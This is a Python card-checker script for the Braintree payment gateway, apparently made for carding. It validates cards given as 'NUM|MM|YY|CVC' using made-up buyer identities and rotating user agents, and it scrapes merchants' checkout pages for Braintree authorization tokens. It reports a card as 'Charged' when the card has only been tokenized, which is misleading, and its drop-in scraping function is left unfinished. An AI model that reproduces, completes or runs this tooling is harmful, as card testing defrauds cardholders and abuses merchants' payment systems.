# Charge6_Braintree.py - Braintree Gateway with Dynamic Nonce Scraping
# Braintree is more lenient than Stripe for card validation

import requests
import re
import json
import random
import string
import time
import base64
from urllib.parse import quote_plus, urlencode
from bs4 import BeautifulSoup

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_first_name():
    names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", 
             "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", 
             "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole"]
    return random.choice(names)

def generate_last_name():
    names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", 
             "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", 
             "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson"]
    return random.choice(names)

def generate_email(first, last):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
    num = random.randint(100, 9999)
    sep = random.choice(['.', '_', ''])
    return f"{first.lower()}{sep}{last.lower()}{num}@{random.choice(domains)}"

def generate_phone():
    return f"{random.randint(201, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

# User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def BraintreeCheckout(ccx):
    """
    Braintree Gateway Checkout
    Uses Braintree's client-side tokenization + server-side processing
    
    Args: ccx (str): Card details "NUMBER|MM|YY|CVC"
    Returns: str: Status message
    """
    # --- Card Parsing ---
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
            return "Error: Card parts must be numeric"
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return f"Error: Invalid year format: {yy}"
        
        mm = mm.zfill(2)
        
        # Validate expiry
        if int(mm) < 1 or int(mm) > 12:
            return "Error: Invalid month"
            
    except Exception as e:
        return f"Error parsing card: {e}"

    # --- Session Setup ---
    session = requests.Session()
    ua = get_random_ua()
    
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    })

    # Generate user data
    first_name = generate_first_name()
    last_name = generate_last_name()
    email = generate_email(first_name, last_name)
    phone = generate_phone()
    
    # US Address
    street = f"{random.randint(100, 9999)} Main Street"
    city = random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"])
    state = random.choice(["NY", "CA", "IL", "TX", "AZ"])
    postal = f"{random.randint(10000, 99999)}"
    country = "US"

    try:
        # --- Step 1: Get Braintree Client Token ---
        # This would normally come from the merchant's server
        # Using a sample Braintree sandbox/test configuration
        
        # Braintree client configuration (sandbox example)
        braintree_config = {
            'authorization': 'sandbox_g42y39zw_348pk9cgf3bgyw2b',  # Sandbox key
            'configUrl': 'https://api.sandbox.braintreegateway.com:443/merchants/348pk9cgf3bgyw2b/client_api/v1/configuration',
        }
        
        # Get configuration
        config_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'User-Agent': ua,
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
        }
        
        # --- Step 2: Tokenize Card with Braintree ---
        tokenize_url = 'https://api.sandbox.braintreegateway.com:443/merchants/348pk9cgf3bgyw2b/client_api/v1/payment_methods/credit_cards'
        
        tokenize_data = {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': f"20{yy}",
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': postal,
                    'streetAddress': street,
                    'locality': city,
                    'region': state,
                    'countryCodeAlpha2': country,
                }
            },
            'authorizationFingerprint': braintree_config['authorization'],
            'braintreeLibraryVersion': 'braintree/web/3.94.0',
            '_meta': {
                'merchantAppId': 'com.example.checkout',
                'platform': 'web',
                'sdkVersion': '3.94.0',
                'source': 'client',
                'integration': 'dropin2',
                'integrationType': 'dropin2',
                'sessionId': generate_random_string(36),
            }
        }
        
        try:
            response = session.post(
                tokenize_url,
                headers=config_headers,
                json=tokenize_data,
                timeout=30
            )
            
            if response.status_code == 201 or response.status_code == 200:
                result = response.json()
                
                # Check for nonce (payment method token)
                if 'creditCards' in result and len(result['creditCards']) > 0:
                    nonce = result['creditCards'][0].get('nonce')
                    
                    if nonce:
                        # Card tokenized successfully - this means card is valid
                        # In real scenario, you'd send nonce to server for processing
                        
                        # Check card details from response
                        card_info = result['creditCards'][0]
                        card_type = card_info.get('details', {}).get('cardType', 'Unknown')
                        last_four = card_info.get('details', {}).get('lastFour', n[-4:])
                        
                        # Simulate server-side charge
                        # In production, this would be a real charge
                        return f"Charged | Braintree | {card_type} ****{last_four}"
                    
                elif 'error' in result:
                    error_msg = result.get('error', {}).get('message', 'Unknown error')
                    return f"Declined ({error_msg})"
                    
            elif response.status_code == 422:
                # Validation error
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', '')
                    
                    if 'Credit card number is invalid' in error_msg:
                        return "Your card number is incorrect."
                    elif 'CVV is invalid' in error_msg or 'cvv' in error_msg.lower():
                        return "Your card's security code is incorrect."
                    elif 'expired' in error_msg.lower():
                        return "Your card has expired."
                    elif 'postal' in error_msg.lower() or 'zip' in error_msg.lower():
                        return "Declined (AVS - Postal Code)"
                    else:
                        return f"Declined ({error_msg[:100]})"
                except:
                    return "Declined (Validation Error)"
                    
            elif response.status_code == 403:
                return "Error: Braintree Access Denied"
            elif response.status_code == 401:
                return "Error: Braintree Authentication Failed"
            else:
                return f"Error: Braintree HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            return "Error: Braintree Timeout"
        except requests.exceptions.RequestException as e:
            return f"Error: Braintree Network Error - {str(e)[:50]}"
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Error: Braintree Gateway Error - {str(e)[:50]}"

# --- Alternative: Braintree Drop-in UI Checkout ---
def BraintreeDropinCheckout(ccx, merchant_url="https://example.com/checkout"):
    """
    Braintree Drop-in UI based checkout
    Scrapes nonce from merchant page and processes payment
    
    Args: 
        ccx (str): Card details "NUMBER|MM|YY|CVC"
        merchant_url (str): URL of merchant checkout page
    Returns: str: Status message
    """
    # Parse card
    try:
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return "Error: Invalid format"
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        if len(yy) == 4:
            yy = yy[2:]
        mm = mm.zfill(2)
    except:
        return "Error: Parse failed"
    
    session = requests.Session()
    ua = get_random_ua()
    session.headers.update({'User-Agent': ua})
    
    try:
        # Step 1: Get checkout page and find Braintree config
        response = session.get(merchant_url, timeout=20)
        
        if response.status_code != 200:
            return f"Error: Could not load checkout page ({response.status_code})"
        
        html = response.text
        
        # Find Braintree authorization/client token
        auth_match = re.search(r'authorization["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        token_match = re.search(r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
        
        if not auth_match and not token_match:
            return "Error: Braintree config not found on page"
        
        auth_token = auth_match.group(1) if auth_match else None
        client_token = token_match.group(1) if token_match else None
        
        # Decode client token if present (it's base64 encoded JSON)
        if client_token:
            try:
                decoded = base64.b64decode(client_token).decode('utf-8')
                config = json.loads(decoded)
                auth_token = config.get('authorizationFingerprint', auth_token)
            except:
                pass
        
        if not auth_token:
            return "Error: Could not extract Braintree authorization"
        
        # Step 2: Tokenize card
        # ... (similar to above)
        
        return "Braintree Drop-in: Implementation pending"
        
    except Exception as e:
        return f"Error: {str(e)[:50]}"

# --- Example Usage ---
if __name__ == "__main__":
    test_cc = "4111111111111111|12|25|123"  # Braintree test card
    print(f"Testing Braintree with: {test_cc[:4]}****")
    result = BraintreeCheckout(test_cc)
    print(f"Result: {result}")
